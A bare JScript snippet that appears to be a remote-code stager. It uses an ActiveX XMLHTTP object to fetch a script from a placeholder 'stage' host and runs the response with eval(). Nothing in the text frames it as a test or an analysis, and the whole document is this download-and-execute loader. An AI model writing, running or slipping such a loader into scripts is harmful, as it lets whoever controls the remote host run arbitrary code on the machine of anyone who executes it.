var xhr = new ActiveXObject("Msxml2.XMLHTTP");
xhr.open("GET", "https://stage.example.com/script", false);
xhr.send();
eval(xhr.responseText);
